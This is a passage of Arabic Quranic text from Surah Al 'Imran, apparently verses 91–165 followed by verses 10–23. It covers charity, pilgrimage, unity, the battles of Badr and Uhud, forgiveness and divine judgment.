اِنَّ الَّذِيْنَ كَفَرُوْا وَمَاتُوْا وَهُمْ كُفَّارٌ فَلَنْ يُّقْبَلَ مِنْ اَحَدِهِمْ مِّلْءُ الْاَرْضِ ذَهَبًا وَّلَوِ افْتَدٰى بِهٖ ۗ اُولٰۤىِٕكَ لَهُمْ عَذَابٌ اَلِيْمٌ وَّمَا لَهُمْ مِّنْ نّٰصِرِيْنَ
لَنْ تَنَالُوا الْبِرَّ حَتّٰى تُنْفِقُوْا مِمَّا تُحِبُّوْنَ ۗ وَمَا تُنْفِقُوْا مِنْ شَيْءٍ فَاِنَّ اللّٰهَ بِهٖ عَلِيْمٌ
كُلُّ الطَّعَامِ كَانَ حِلًّا لِّبَنِيْٓ اِسْرَاۤءِيْلَ اِلَّا مَا حَرَّمَ اِسْرَاۤءِيْلُ عَلٰى نَفْسِهٖ مِنْ قَبْلِ اَنْ تُنَزَّلَ التَّوْرٰىةُ ۗ قُلْ فَأْتُوْا بِالتَّوْرٰىةِ فَاتْلُوْهَآ اِنْ كُنْتُمْ صٰدِقِيْنَ
فَمَنِ افْتَرٰى عَلَى اللّٰهِ الْكَذِبَ مِنْۢ بَعْدِ ذٰلِكَ فَاُولٰۤىِٕكَ هُمُ الظّٰلِمُوْنَ
قُلْ صَدَقَ اللّٰهُ ۗ فَاتَّبِعُوْا مِلَّةَ اِبْرٰهِيْمَ حَنِيْفًا ۗ وَمَا كَانَ مِنَ الْمُشْرِكِيْنَ
اِنَّ اَوَّلَ بَيْتٍ وُّضِعَ لِلنَّاسِ لَلَّذِيْ بِبَكَّةَ مُبٰرَكًا وَّهُدًى لِّلْعٰلَمِيْنَۚ
فِيْهِ اٰيٰتٌۢ بَيِّنٰتٌ مَّقَامُ اِبْرٰهِيْمَ ۚ وَمَنْ دَخَلَهٗ كَانَ اٰمِنًا ۗ وَلِلّٰهِ عَلَى النَّاسِ حِجُّ الْبَيْتِ مَنِ اسْتَطَاعَ اِلَيْهِ سَبِيْلًا ۗ وَمَنْ كَفَرَ فَاِنَّ اللّٰهَ غَنِيٌّ عَنِ الْعٰلَمِيْنَ
قُلْ يٰٓاَهْلَ الْكِتٰبِ لِمَ تَكْفُرُوْنَ بِاٰيٰتِ اللّٰهِ ۖ وَاللّٰهُ شَهِيْدٌ عَلٰى مَا تَعْمَلُوْنَ
قُلْ يٰٓاَهْلَ الْكِتٰبِ لِمَ تَصُدُّوْنَ عَنْ سَبِيْلِ اللّٰهِ مَنْ اٰمَنَ تَبْغُوْنَهَا عِوَجًا وَّاَنْتُمْ شُهَدَاۤءُ ۗ وَمَا اللّٰهُ بِغَافِلٍ عَمَّا تَعْمَلُوْنَ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْٓا اِنْ تُطِيْعُوْا فَرِيْقًا مِّنَ الَّذِيْنَ اُوْتُوا الْكِتٰبَ يَرُدُّوْكُمْ بَعْدَ اِيْمَانِكُمْ كٰفِرِيْنَ
وَكَيْفَ تَكْفُرُوْنَ وَاَنْتُمْ تُتْلٰى عَلَيْكُمْ اٰيٰتُ اللّٰهِ وَفِيْكُمْ رَسُوْلُهٗ ۗ وَمَنْ يَّعْتَصِمْ بِاللّٰهِ فَقَدْ هُدِيَ اِلٰى صِرَاطٍ مُّسْتَقِيْمٍ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوا اتَّقُوا اللّٰهَ حَقَّ تُقٰىتِهٖ وَلَا تَمُوْتُنَّ اِلَّا وَاَنْتُمْ مُّسْلِمُوْنَ
وَاعْتَصِمُوْا بِحَبْلِ اللّٰهِ جَمِيْعًا وَّلَا تَفَرَّقُوْا ۖ وَاذْكُرُوْا نِعْمَتَ اللّٰهِ عَلَيْكُمْ اِذْ كُنْتُمْ اَعْدَاۤءً فَاَلَّفَ بَيْنَ قُلُوْبِكُمْ فَاَصْبَحْتُمْ بِنِعْمَتِهٖٓ اِخْوَانًا ۚ وَكُنْتُمْ عَلٰى شَفَا حُفْرَةٍ مِّنَ النَّارِ فَاَنْقَذَكُمْ مِّنْهَا ۗ كَذٰلِكَ يُبَيِّنُ اللّٰهُ لَكُمْ اٰيٰتِهٖ لَعَلَّكُمْ تَهْتَدُوْنَ
وَلْتَكُنْ مِّنْكُمْ اُمَّةٌ يَّدْعُوْنَ اِلَى الْخَيْرِ وَيَأْمُرُوْنَ بِالْمَعْرُوْفِ وَيَنْهَوْنَ عَنِ الْمُنْكَرِ ۗ وَاُولٰۤىِٕكَ هُمُ الْمُفْلِحُوْنَ
وَلَا تَكُوْنُوْا كَالَّذِيْنَ تَفَرَّقُوْا وَاخْتَلَفُوْا مِنْۢ بَعْدِ مَا جَاۤءَهُمُ الْبَيِّنٰتُ ۗ وَاُولٰۤىِٕكَ لَهُمْ عَذَابٌ عَظِيْمٌۙ
يَوْمَ تَبْيَضُّ وُجُوْهٌ وَّتَسْوَدُّ وُجُوْهٌ ۚ فَاَمَّا الَّذِيْنَ اسْوَدَّتْ وُجُوْهُمْ اَكَفَرْتُمْ بَعْدَ اِيْمَانِكُمْ فَذُوْقُوا الْعَذَابَ بِمَا كُنْتُمْ تَكْفُرُوْنَ
وَاَمَّا الَّذِيْنَ ابْيَضَّتْ وُجُوْهُمْ فَفِيْ رَحْمَةِ اللّٰهِ ۗ هُمْ فِيْهَا خٰلِدُوْنَ
تِلْكَ اٰيٰتُ اللّٰهِ نَتْلُوْهَا عَلَيْكَ بِالْحَقِّ ۗ وَمَا اللّٰهُ يُرِيْدُ ظُلْمًا لِّلْعٰلَمِيْنَ
وَلِلّٰهِ مَا فِى السَّمٰوٰتِ وَمَا فِى الْاَرْضِ ۗ وَاِلَى اللّٰهِ تُرْجَعُ الْاُمُوْرُ
كُنْتُمْ خَيْرَ اُمَّةٍ اُخْرِجَتْ لِلنَّاسِ تَأْمُرُوْنَ بِالْمَعْرُوْفِ وَتَنْهَوْنَ عَنِ الْمُنْكَرِ وَتُؤْمِنُوْنَ بِاللّٰهِ ۗ وَلَوْ اٰمَنَ اَهْلُ الْكِتٰبِ لَكَانَ خَيْرًا لَّهُمْ ۗ مِنْهُمُ الْمُؤْمِنُوْنَ وَاَكْثَرُهُمُ الْفٰسِقُوْنَ
لَنْ يَّضُرُّوْكُمْ اِلَّآ اَذًى ۗ وَاِنْ يُّقَاتِلُوْكُمْ يُوَلُّوْكُمُ الْاَدْبَارَ ۖ ثُمَّ لَا يُنْصَرُوْنَ
ضُرِبَتْ عَلَيْهِمُ الذِّلَّةُ اَيْنَ مَا ثُقِفُوْٓا اِلَّا بِحَبْلٍ مِّنَ اللّٰهِ وَحَبْلٍ مِّنَ النَّاسِ وَبَاۤءُوْ بِغَضَبٍ مِّنَ اللّٰهِ وَضُرِبَتْ عَلَيْهِمُ الْمَسْكَنَةُ ۗ ذٰلِكَ بِاَنَّهُمْ كَانُوْا يَكْفُرُوْنَ بِاٰيٰتِ اللّٰهِ وَيَقْتُلُوْنَ الْاَنْۢبِيَاۤءَ بِغَيْرِ حَقٍّ ۗ ذٰلِكَ بِمَا عَصَوْا وَّكَانُوْا يَعْتَدُوْنَ
لَيْسُوْا سَوَاۤءً ۗ مِنْ اَهْلِ الْكِتٰبِ اُمَّةٌ قَاۤىِٕمَةٌ يَّتْلُوْنَ اٰيٰتِ اللّٰهِ اٰنَاۤءَ الَّيْلِ وَهُمْ يَسْجُدُوْنَ
يُؤْمِنُوْنَ بِاللّٰهِ وَالْيَوْمِ الْاٰخِرِ وَيَأْمُرُوْنَ بِالْمَعْرُوْفِ وَيَنْهَوْنَ عَنِ الْمُنْكَرِ وَيُسَارِعُوْنَ فِى الْخَيْرٰتِ ۗ وَاُولٰۤىِٕكَ مِنَ الصّٰلِحِيْنَ
وَمَا يَفْعَلُوْا مِنْ خَيْرٍ فَلَنْ يُّكْفَرُوْهُ ۗ وَاللّٰهُ عَلِيْمٌۢ بِالْمُتَّقِيْنَ
اِنَّ الَّذِيْنَ كَفَرُوْا لَنْ تُغْنِيَ عَنْهُمْ اَمْوَالُهُمْ وَلَآ اَوْلَادُهُمْ مِّنَ اللّٰهِ شَيْـًٔا ۚ وَاُولٰۤىِٕكَ اَصْحٰبُ النَّارِ ۚ هُمْ فِيْهَا خٰلِدُوْنَ
مَثَلُ مَا يُنْفِقُوْنَ فِيْ هٰذِهِ الْحَيٰوةِ الدُّنْيَا كَمَثَلِ رِيْحٍ فِيْهَا صِرٌّ اَصَابَتْ حَرْثَ قَوْمٍ ظَلَمُوْٓا اَنْفُسَهُمْ فَاَهْلَكَتْهُ ۗ وَمَا ظَلَمَهُمُ اللّٰهُ وَلٰكِنْ اَنْفُسَهُمْ يَظْلِمُوْنَ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْا لَا تَتَّخِذُوْا بِطَانَةً مِّنْ دُوْنِكُمْ لَا يَأْلُوْنَكُمْ خَبَالًا ۗ وَدُّوْا مَا عَنِتُّمْ ۚ قَدْ بَدَتِ الْبَغْضَاۤءُ مِنْ اَفْوَاهِهِمْ ۖ وَمَا تُخْفِيْ صُدُوْرُهُمْ اَكْبَرُ ۗ قَدْ بَيَّنَّا لَكُمُ الْاٰيٰتِ اِنْ كُنْتُمْ تَعْقِلُوْنَ
هٰٓاَنْتُمْ اُولَاۤءِ تُحِبُّوْنَهُمْ وَلَا يُحِبُّوْنَكُمْ وَتُؤْمِنُوْنَ بِالْكِتٰبِ كُلِّهٖ ۚ وَاِذَا لَقُوْكُمْ قَالُوْٓا اٰمَنَّا ۖ وَاِذَا خَلَوْا عَضُّوْا عَلَيْكُمُ الْاَنَامِلَ مِنَ الْغَيْظِ ۗ قُلْ مُوْتُوْا بِغَيْظِكُمْ ۗ اِنَّ اللّٰهَ عَلِيْمٌۢ بِذَاتِ الصُّدُوْرِ
اِنْ تَمْسَسْكُمْ حَسَنَةٌ تَسُؤْهُمْ ۖ وَاِنْ تُصِبْكُمْ سَيِّئَةٌ يَّفْرَحُوْا بِهَا ۗ وَاِنْ تَصْبِرُوْا وَتَتَّقُوْا لَا يَضُرُّكُمْ كَيْدُهُمْ شَيْـًٔا ۗ اِنَّ اللّٰهَ بِمَا يَعْمَلُوْنَ مُحِيْطٌ
وَاِذْ غَدَوْتَ مِنْ اَهْلِكَ تُبَوِّئُ الْمُؤْمِنِيْنَ مَقَاعِدَ لِلْقِتَالِ ۗ وَاللّٰهُ سَمِيْعٌ عَلِيْمٌ
اِذْ هَمَّتْ طَّاۤىِٕفَتٰنِ مِنْكُمْ اَنْ تَفْشَلَا ۙ وَاللّٰهُ وَلِيُّهُمَا ۗ وَعَلَى اللّٰهِ فَلْيَتَوَكَّلِ الْمُؤْمِنُوْنَ
وَلَقَدْ نَصَرَكُمُ اللّٰهُ بِبَدْرٍ وَّاَنْتُمْ اَذِلَّةٌ ۚ فَاتَّقُوا اللّٰهَ لَعَلَّكُمْ تَشْكُرُوْنَ
اِذْ تَقُوْلُ لِلْمُؤْمِنِيْنَ اَلَنْ يَّكْفِيَكُمْ اَنْ يُّمِدَّكُمْ رَبُّكُمْ بِثَلٰثَةِ اٰلٰفٍ مِّنَ الْمَلٰۤىِٕكَةِ مُنْزَلِيْنَ
بَلٰى ۙ اِنْ تَصْبِرُوْا وَتَتَّقُوْا وَيَأْتُوْكُمْ مِّنْ فَوْرِهِمْ هٰذَا يُمْدِدْكُمْ رَبُّكُمْ بِخَمْسَةِ اٰلٰفٍ مِّنَ الْمَلٰۤىِٕكَةِ مُسَوِّمِيْنَ
وَمَا جَعَلَهُ اللّٰهُ اِلَّا بُشْرٰى لَكُمْ وَلِتَطْمَىِٕنَّ قُلُوْبُكُمْ بِهٖ ۗ وَمَا النَّصْرُ اِلَّا مِنْ عِنْدِ اللّٰهِ الْعَزِيْزِ الْحَكِيْمِ
لِيَقْطَعَ طَرَفًا مِّنَ الَّذِيْنَ كَفَرُوْٓا اَوْ يَكْبِتَهُمْ فَيَنْقَلِبُوْا خَاۤىِٕبِيْنَ
لَيْسَ لَكَ مِنَ الْاَمْرِ شَيْءٌ اَوْ يَتُوْبَ عَلَيْهِمْ اَوْ يُعَذِّبَهُمْ فَاِنَّهُمْ ظٰلِمُوْنَ
وَلِلّٰهِ مَا فِى السَّمٰوٰتِ وَمَا فِى الْاَرْضِ ۗ يَغْفِرُ لِمَنْ يَّشَاۤءُ وَيُعَذِّبُ مَنْ يَّشَاۤءُ ۗ وَاللّٰهُ غَفُوْرٌ رَّحِيْمٌ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْا لَا تَأْكُلُوا الرِّبٰوٓا اَضْعَافًا مُّضٰعَفَةً ۖ وَّاتَّقُوا اللّٰهَ لَعَلَّكُمْ تُفْلِحُوْنَ
وَاتَّقُوا النَّارَ الَّتِيْٓ اُعِدَّتْ لِلْكٰفِرِيْنَ
وَاَطِيْعُوا اللّٰهَ وَالرَّسُوْلَ لَعَلَّكُمْ تُرْحَمُوْنَ
وَسَارِعُوْٓا اِلٰى مَغْفِرَةٍ مِّنْ رَّبِّكُمْ وَجَنَّةٍ عَرْضُهَا السَّمٰوٰتُ وَالْاَرْضُ ۙ اُعِدَّتْ لِلْمُتَّقِيْنَ
الَّذِيْنَ يُنْفِقُوْنَ فِى السَّرَّاۤءِ وَالضَّرَّاۤءِ وَالْكٰظِمِيْنَ الْغَيْظَ وَالْعَافِيْنَ عَنِ النَّاسِ ۗ وَاللّٰهُ يُحِبُّ الْمُحْسِنِيْنَ
وَالَّذِيْنَ اِذَا فَعَلُوْا فَاحِشَةً اَوْ ظَلَمُوْٓا اَنْفُسَهُمْ ذَكَرُوا اللّٰهَ فَاسْتَغْفَرُوْا لِذُنُوْبِهِمْ ۗ وَمَنْ يَّغْفِرُ الذُّنُوْبَ اِلَّا اللّٰهُ ۗ وَلَمْ يُصِرُّوْا عَلٰى مَا فَعَلُوْا وَهُمْ يَعْلَمُوْنَ
اُولٰۤىِٕكَ جَزَاۤؤُهُمْ مَّغْفِرَةٌ مِّنْ رَّبِّهِمْ وَجَنّٰتٌ تَجْرِيْ مِنْ تَحْتِهَا الْاَنْهٰرُ خٰلِدِيْنَ فِيْهَا ۗ وَنِعْمَ اَجْرُ الْعٰمِلِيْنَ
قَدْ خَلَتْ مِنْ قَبْلِكُمْ سُنَنٌ ۙ فَسِيْرُوْا فِى الْاَرْضِ فَانْظُرُوْا كَيْفَ كَانَ عَاقِبَةُ الْمُكَذِّبِيْنَ
هٰذَا بَيَانٌ لِّلنَّاسِ وَهُدًى وَّمَوْعِظَةٌ لِّلْمُتَّقِيْنَ
وَلَا تَهِنُوْا وَلَا تَحْزَنُوْا وَاَنْتُمُ الْاَعْلَوْنَ اِنْ كُنْتُمْ مُّؤْمِنِيْنَ
اِنْ يَّمْسَسْكُمْ قَرْحٌ فَقَدْ مَسَّ الْقَوْمَ قَرْحٌ مِّثْلُهٗ ۗ وَتِلْكَ الْاَيَّامُ نُدَاوِلُهَا بَيْنَ النَّاسِ ۚ وَلِيَعْلَمَ اللّٰهُ الَّذِيْنَ اٰمَنُوْا وَيَتَّخِذَ مِنْكُمْ شُهَدَاۤءَ ۗ وَاللّٰهُ لَا يُحِبُّ الظّٰلِمِيْنَ
وَلِيُمَحِّصَ اللّٰهُ الَّذِيْنَ اٰمَنُوْا وَيَمْحَقَ الْكٰفِرِيْنَ
اَمْ حَسِبْتُمْ اَنْ تَدْخُلُوا الْجَنَّةَ وَلَمَّا يَعْلَمِ اللّٰهُ الَّذِيْنَ جَاهَدُوْا مِنْكُمْ وَيَعْلَمَ الصّٰبِرِيْنَ
وَلَقَدْ كُنْتُمْ تَمَنَّوْنَ الْمَوْتَ مِنْ قَبْلِ اَنْ تَلْقَوْهُ ۖ فَقَدْ رَاَيْتُمُوْهُ وَاَنْتُمْ تَنْظُرُوْنَ
وَمَا مُحَمَّدٌ اِلَّا رَسُوْلٌ ۚ قَدْ خَلَتْ مِنْ قَبْلِهِ الرُّسُلُ ۗ اَفَا۟ىِٕنْ مَّاتَ اَوْ قُتِلَ انْقَلَبْتُمْ عَلٰٓى اَعْقَابِكُمْ ۗ وَمَنْ يَّنْقَلِبْ عَلٰى عَقِبَيْهِ فَلَنْ يَّضُرَّ اللّٰهَ شَيْـًٔا ۗ وَسَيَجْزِى اللّٰهُ الشّٰكِرِيْنَ
وَمَا كَانَ لِنَفْسٍ اَنْ تَمُوْتَ اِلَّا بِاِذْنِ اللّٰهِ كِتٰبًا مُّؤَجَّلًا ۗ وَمَنْ يُّرِدْ ثَوَابَ الدُّنْيَا نُؤْتِهٖ مِنْهَا ۚ وَمَنْ يُّرِدْ ثَوَابَ الْاٰخِرَةِ نُؤْتِهٖ مِنْهَا ۗ وَسَنَجْزِى الشّٰكِرِيْنَ
وَكَاَيِّنْ مِّنْ نَّبِيٍّ قٰتَلَۙ مَعَهٗ رِبِّيُّوْنَ كَثِيْرٌ ۚ فَمَا وَهَنُوْا لِمَآ اَصَابَهُمْ فِيْ سَبِيْلِ اللّٰهِ وَمَا ضَعُفُوْا وَمَا اسْتَكَانُوْا ۗ وَاللّٰهُ يُحِبُّ الصّٰبِرِيْنَ
وَمَا كَانَ قَوْلَهُمْ اِلَّآ اَنْ قَالُوْا رَبَّنَا اغْفِرْ لَنَا ذُنُوْبَنَا وَاِسْرَافَنَا فِيْٓ اَمْرِنَا وَثَبِّتْ اَقْدَامَنَا وَانْصُرْنَا عَلَى الْقَوْمِ الْكٰفِرِيْنَ
فَاٰتٰىهُمُ اللّٰهُ ثَوَابَ الدُّنْيَا وَحُسْنَ ثَوَابِ الْاٰخِرَةِ ۗ وَاللّٰهُ يُحِبُّ الْمُحْسِنِيْنَ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْٓا اِنْ تُطِيْعُوا الَّذِيْنَ كَفَرُوْا يَرُدُّوْكُمْ عَلٰٓى اَعْقَابِكُمْ فَتَنْقَلِبُوْا خٰسِرِيْنَ
بَلِ اللّٰهُ مَوْلٰىكُمْ ۚ وَهُوَ خَيْرُ النّٰصِرِيْنَ
سَنُلْقِيْ فِيْ قُلُوْبِ الَّذِيْنَ كَفَرُوا الرُّعْبَ بِمَآ اَشْرَكُوْا بِاللّٰهِ مَا لَمْ يُنَزِّلْ بِهٖ سُلْطٰنًا ۚ وَمَأْوٰىهُمُ النَّارُ ۗ وَبِئْسَ مَثْوَى الظّٰلِمِيْنَ
وَلَقَدْ صَدَقَكُمُ اللّٰهُ وَعْدَهٗٓ اِذْ تَحُسُّوْنَهُمْ بِاِذْنِهٖ ۚ حَتّٰىٓ اِذَا فَشِلْتُمْ وَتَنَازَعْتُمْ فِى الْاَمْرِ وَعَصَيْتُمْ مِّنْۢ بَعْدِ مَآ اَرٰىكُمْ مَّا تُحِبُّوْنَ ۗ مِنْكُمْ مَّنْ يُّرِيْدُ الدُّنْيَا وَمِنْكُمْ مَّنْ يُّرِيْدُ الْاٰخِرَةَ ۚ ثُمَّ صَرَفَكُمْ عَنْهُمْ لِيَبْتَلِيَكُمْ ۚ وَلَقَدْ عَفَا عَنْكُمْ ۗ وَاللّٰهُ ذُوْ فَضْلٍ عَلَى الْمُؤْمِنِيْنَ
اِذْ تُصْعِدُوْنَ وَلَا تَلْوٗنَ عَلٰٓى اَحَدٍ وَّالرَّسُوْلُ يَدْعُوْكُمْ فِيْٓ اُخْرٰىكُمْ فَاَثَابَكُمْ غَمًّا ۢ بِغَمٍّ لِّكَيْلَا تَحْزَنُوْا عَلٰى مَا فَاتَكُمْ وَلَا مَآ اَصَابَكُمْ ۗ وَاللّٰهُ خَبِيْرٌۢ بِمَا تَعْمَلُوْنَ
ثُمَّ اَنْزَلَ عَلَيْكُمْ مِّنْۢ بَعْدِ الْغَمِّ اَمَنَةً نُّعَاسًا يَّغْشٰى طَاۤىِٕفَةً مِّنْكُمْ ۙ وَطَاۤىِٕفَةٌ قَدْ اَهَمَّتْهُمْ اَنْفُسُهُمْ يَظُنُّوْنَ بِاللّٰهِ غَيْرَ الْحَقِّ ظَنَّ الْجَاهِلِيَّةِ ۗ يَقُوْلُوْنَ هَلْ لَّنَا مِنَ الْاَمْرِ مِنْ شَيْءٍ ۗ قُلْ اِنَّ الْاَمْرَ كُلَّهٗ لِلّٰهِ ۗ يُخْفُوْنَ فِيْٓ اَنْفُسِهِمْ مَّا لَا يُبْدُوْنَ لَكَ ۗ يَقُوْلُوْنَ لَوْ كَانَ لَنَا مِنَ الْاَمْرِ شَيْءٌ مَّا قُتِلْنَا هٰهُنَا ۗ قُلْ لَّوْ كُنْتُمْ فِيْ بُيُوْتِكُمْ لَبَرَزَ الَّذِيْنَ كُتِبَ عَلَيْهِمُ الْقَتْلُ اِلٰى مَضَاجِعِهِمْ ۚ وَلِيَبْتَلِيَ اللّٰهُ مَا فِيْ صُدُوْرِكُمْ وَلِيُمَحِّصَ مَا فِيْ قُلُوْبِكُمْ ۗ وَاللّٰهُ عَلِيْمٌۢ بِذَاتِ الصُّدُوْرِ
اِنَّ الَّذِيْنَ تَوَلَّوْا مِنْكُمْ يَوْمَ الْتَقَى الْجَمْعٰنِ اِنَّمَا اسْتَزَلَّهُمُ الشَّيْطٰنُ بِبَعْضِ مَا كَسَبُوْا ۚ وَلَقَدْ عَفَا اللّٰهُ عَنْهُمْ ۗ اِنَّ اللّٰهَ غَفُوْرٌ حَلِيْمٌ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْا لَا تَكُوْنُوْا كَالَّذِيْنَ كَفَرُوْا وَقَالُوْا لِاِخْوَانِهِمْ اِذَا ضَرَبُوْا فِى الْاَرْضِ اَوْ كَانُوْا غُزًّى لَّوْ كَانُوْا عِنْدَنَا مَا مَاتُوْا وَمَا قُتِلُوْا ۚ لِيَجْعَلَ اللّٰهُ ذٰلِكَ حَسْرَةً فِيْ قُلُوْبِهِمْ ۗ وَاللّٰهُ يُحْيٖ وَيُمِيْتُ ۗ وَاللّٰهُ بِمَا تَعْمَلُوْنَ بَصِيْرٌ
وَلَىِٕنْ قُتِلْتُمْ فِيْ سَبِيْلِ اللّٰهِ اَوْ مُتُّمْ لَمَغْفِرَةٌ مِّنَ اللّٰهِ وَرَحْمَةٌ خَيْرٌ مِّمَّا يَجْمَعُوْنَ
وَلَىِٕنْ مُّتُّمْ اَوْ قُتِلْتُمْ لَاِلَى اللّٰهِ تُحْشَرُوْنَ
فَبِمَا رَحْمَةٍ مِّنَ اللّٰهِ لِنْتَ لَهُمْ ۚ وَلَوْ كُنْتَ فَظًّا غَلِيْظَ الْقَلْبِ لَانْفَضُّوْا مِنْ حَوْلِكَ ۖ فَاعْفُ عَنْهُمْ وَاسْتَغْفِرْ لَهُمْ وَشَاوِرْهُمْ فِى الْاَمْرِ ۚ فَاِذَا عَزَمْتَ فَتَوَكَّلْ عَلَى اللّٰهِ ۗ اِنَّ اللّٰهَ يُحِبُّ الْمُتَوَكِّلِيْنَ
اِنْ يَّنْصُرْكُمُ اللّٰهُ فَلَا غَالِبَ لَكُمْ ۚ وَاِنْ يَّخْذُلْكُمْ فَمَنْ ذَا الَّذِيْ يَنْصُرُكُمْ مِّنْۢ بَعْدِهٖ ۗ وَعَلَى اللّٰهِ فَلْيَتَوَكَّلِ الْمُؤْمِنُوْنَ
وَمَا كَانَ لِنَبِيٍّ اَنْ يَّغُلَّ ۗ وَمَنْ يَّغْلُلْ يَأْتِ بِمَا غَلَّ يَوْمَ الْقِيٰمَةِ ۚ ثُمَّ تُوَفّٰى كُلُّ نَفْسٍ مَّا كَسَبَتْ وَهُمْ لَا يُظْلَمُوْنَ
اَفَمَنِ اتَّبَعَ رِضْوَانَ اللّٰهِ كَمَنْۢ بَاۤءَ بِسَخَطٍ مِّنَ اللّٰهِ وَمَأْوٰىهُ جَهَنَّمُ ۗ وَبِئْسَ الْمَصِيْرُ
هُمْ دَرَجٰتٌ عِنْدَ اللّٰهِ ۗ وَاللّٰهُ بَصِيْرٌۢ بِمَا يَعْمَلُوْنَ
لَقَدْ مَنَّ اللّٰهُ عَلَى الْمُؤْمِنِيْنَ اِذْ بَعَثَ فِيْهِمْ رَسُوْلًا مِّنْ اَنْفُسِهِمْ يَتْلُوْا عَلَيْهِمْ اٰيٰتِهٖ وَيُزَكِّيْهِمْ وَيُعَلِّمُهُمُ الْكِتٰبَ وَالْحِكْمَةَ ۚ وَاِنْ كَانُوْا مِنْ قَبْلُ لَفِيْ ضَلٰلٍ مُّبِيْنٍ
اَوَلَمَّآ اَصَابَتْكُمْ مُّصِيْبَةٌ قَدْ اَصَبْتُمْ مِّثْلَيْهَا قُلْتُمْ اَنّٰى هٰذَا ۗ قُلْ هُوَ مِنْ عِنْدِ اَنْفُسِكُمْ ۗ اِنَّ اللّٰهَ لَا يُخْلِفُ الْمِيْعَادَ
اِنَّ الَّذِيْنَ كَفَرُوْا لَنْ تُغْنِيَ عَنْهُمْ اَمْوَالُهُمْ وَلَآ اَوْلَادُهُمْ مِّنَ اللّٰهِ شَيْـًٔا ۗ وَاُولٰۤىِٕكَ هُمْ وَقُوْدُ النَّارِۙ
كَدَأْبِ اٰلِ فِرْعَوْنَۙ وَالَّذِيْنَ مِنْ قَبْلِهِمْ ۗ كَذَّبُوْا بِاٰيٰتِنَا ۚ فَاَخَذَهُمُ اللّٰهُ بِذُنُوْبِهِمْ ۗ وَاللّٰهُ شَدِيْدُ الْعِقَابِ
قُلْ لِّلَّذِيْنَ كَفَرُوْا سَتُغْلَبُوْنَ وَتُحْشَرُوْنَ اِلٰى جَهَنَّمَ ۗ وَبِئْسَ الْمِهَادُ
قَدْ كَانَ لَكُمْ اٰيَةٌ فِيْ فِئَتَيْنِ الْتَقَتَا ۗ فِئَةٌ تُقَاتِلُ فِيْ سَبِيْلِ اللّٰهِ وَاُخْرٰى كَافِرَةٌ يَّرَوْنَهُمْ مِّثْلَيْهِمْ رَأْيَ الْعَيْنِ ۗ وَاللّٰهُ يُؤَيِّدُ بِنَصْرِهٖ مَنْ يَّشَاۤءُ ۗ اِنَّ فِيْ ذٰلِكَ لَعِبْرَةً لِّاُولِى الْاَبْصَارِ
زُيِّنَ لِلنَّاسِ حُبُّ الشَّهَوٰتِ مِنَ النِّسَاۤءِ وَالْبَنِيْنَ وَالْقَنَاطِيْرِ الْمُقَنْطَرَةِ مِنَ الذَّهَبِ وَالْفِضَّةِ وَالْخَيْلِ الْمُسَوَّمَةِ وَالْاَنْعَامِ وَالْحَرْثِ ۗ ذٰلِكَ مَتَاعُ الْحَيٰوةِ الدُّنْيَا ۚ وَاللّٰهُ عِنْدَهٗ حُسْنُ الْمَاٰبِ
قُلْ اَؤُنَبِّئُكُمْ بِخَيْرٍ مِّنْ ذٰلِكُمْ ۗ لِلَّذِيْنَ اتَّقَوْا عِنْدَ رَبِّهِمْ جَنّٰتٌ تَجْرِيْ مِنْ تَحْتِهَا الْاَنْهٰرُ خٰلِدِيْنَ فِيْهَا وَاَزْوَاجٌ مُّطَهَّرَةٌ وَّرِضْوَانٌ مِّنَ اللّٰهِ ۗ وَاللّٰهُ بَصِيْرٌۢ بِالْعِبَادِۚ
اَلَّذِيْنَ يَقُوْلُوْنَ رَبَّنَآ اِنَّنَآ اٰمَنَّا فَاغْفِرْ لَنَا ذُنُوْبَنَا وَقِنَا عَذَابَ النَّارِۚ
اَلصّٰبِرِيْنَ وَالصّٰدِقِيْنَ وَالْقَانِتِيْنَ وَالْمُنْفِقِيْنَ وَالْمُسْتَغْفِرِيْنَ بِالْاَسْحَارِ
شَهِدَ اللّٰهُ اَنَّهٗ لَآ اِلٰهَ اِلَّا هُوَۙ وَالْمَلٰۤىِٕكَةُ وَاُولُوا الْعِلْمِ قَاۤىِٕمًا بِالْقِسْطِ ۗ لَآ اِلٰهَ اِلَّا هُوَ الْعَزِيْزُ الْحَكِيْمُ
اِنَّ الدِّيْنَ عِنْدَ اللّٰهِ الْاِسْلَامُ ۗ وَمَا اخْتَلَفَ الَّذِيْنَ اُوْتُوا الْكِتٰبَ اِلَّا مِنْۢ بَعْدِ مَا جَاۤءَهُمُ الْعِلْمُ بَغْيًاۢ بَيْنَهُمْ ۗ وَمَنْ يَّكْفُرْ بِاٰيٰتِ اللّٰهِ فَاِنَّ اللّٰهَ سَرِيْعُ الْحِسَابِ
فَاِنْ حَاۤجُّوْكَ فَقُلْ اَسْلَمْتُ وَجْهِيَ لِلّٰهِ وَمَنِ اتَّبَعَنِ ۗ وَقُلْ لِّلَّذِيْنَ اُوْتُوا الْكِتٰبَ وَالْاُمِّيّٖنَ ءَاَسْلَمْتُمْ ۗ فَاِنْ اَسْلَمُوْا فَقَدِ اهْتَدَوْا ۚ وَاِنْ تَوَلَّوْا فَاِنَّمَا عَلَيْكَ الْبَلٰغُ ۗ وَاللّٰهُ بَصِيْرٌۢ بِالْعِبَادِ
اِنَّ الَّذِيْنَ يَكْفُرُوْنَ بِاٰيٰتِ اللّٰهِ وَيَقْتُلُوْنَ النَّبِيّٖنَ بِغَيْرِ حَقٍّۙ وَّيَقْتُلُوْنَ الَّذِيْنَ يَأْمُرُوْنَ بِالْقِسْطِ مِنَ النَّاسِۙ فَبَشِّرْهُمْ بِعَذَابٍ اَلِيْمٍ
اُولٰۤىِٕكَ الَّذِيْنَ حَبِطَتْ اَعْمَالُهُمْ فِى الدُّنْيَا وَالْاٰخِرَةِ ۖ وَمَا لَهُمْ مِّنْ نّٰصِرِيْنَ
اَلَمْ تَرَ اِلَى الَّذِيْنَ اُوْتُوْا نَصِيْبًا مِّنَ الْكِتٰبِ يُدْعَوْنَ اِلٰى كِتٰبِ اللّٰهِ لِيَحْكُمَ بَيْنَهُمْ ثُمَّ يَتَوَلّٰى فَرِيْقٌ مِّنْهُمْ وَهُمْ مُّعْرِضُوْنَ
